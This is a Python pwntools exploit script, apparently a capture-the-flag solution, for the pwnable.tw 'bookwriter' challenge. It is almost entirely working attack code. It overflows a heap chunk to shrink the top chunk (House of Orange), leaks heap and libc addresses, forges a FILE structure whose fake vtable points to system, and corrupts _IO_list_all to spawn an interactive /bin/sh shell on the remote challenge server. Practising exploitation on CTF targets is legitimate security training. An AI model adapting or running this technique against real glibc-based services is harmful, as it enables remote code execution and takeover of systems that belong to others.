#!/usr/bin/env python
from pwn import *
import pwnlib

debug = 0
elf = ELF('./bookwriter')
if debug:
    p = process('./bookwriter', env={'LD_PRELOAD':'./libc_64.so.6'})
    libc = ELF("./libc_64.so.6")
    context.terminal = ['gnome-terminal','-x','sh','-c']
#    context.log_level = 'debug'
else:
    p = remote("chall.pwnable.tw", 10304)
    libc = ELF("./libc_64.so.6")

def add(num,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(num))
    p.recvuntil('Content :')
    p.send(content)
def view(num):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index of page :')
    p.sendline(str(num))
def edit(num,content):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index of page :')
    p.sendline(str(num))
    p.recvuntil('Content:')
    p.send(content)
def info(num,content):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('(yes:1 / no:0) ')
    p.sendline(str(num))
    if(num):
        p.recvuntil('Author :')
        p.sendline(content)
    else:
        pass

def leak_heap():
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('a'*0x40)
    result = u64(p.recvline()[0:-1].ljust(8,'\0'))
    p.recvuntil('(yes:1 / no:0) ')
    p.sendline('0')
    return result

#part one
p.recvuntil('Author :')
p.sendline('a'*0x40)


add(0x18,'a'*0x18)   #the real chunk size is 0x20
edit(0,'a'*0x18)
edit(0,'\0'*0x18+'\xe1'+'\x0f'+'\0')
heap_addr = leak_heap()
print hex(heap_addr)
add(0x1000,'a'*0x100) #add top chunk to unsorted bin

for i in range(7):
    add(0x50,'a'*0x8)

#gdb.attach(p)
view(3)
p.recvuntil('aaaaaaaa')
libc_addr  = u64(p.recvline()[0:-1].ljust(8,'\0'))
libc.address = libc_addr - 0x3c3b78

print 'libc_base: ', hex(libc.address)
print 'libc_addr:', hex(libc_addr)
print 'system: ',hex(libc.symbols['system'])
print 'heap: ',hex(heap_addr)
print "_IO_list_all: " + hex(libc.symbols['_IO_list_all'])

data = '\0'*0x2b0
payload = '/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)
payload = payload.ljust(0xc0,'\x00')
payload += p64(0xffffffffffffffff)
payload = payload.ljust(0xd8,'\x00')
vtable = heap_addr + 0x2b0 + 0xd8 + 0x8
payload += p64(vtable)
payload +=p64(0)+p64(0)+p64(1)+p64(libc.symbols['system'])

edit(0,data + payload)
#
p.recvuntil('Your choice :')
p.sendline('1')
p.recvuntil('Size of page :')
p.sendline(str(0x10))
p.interactive()
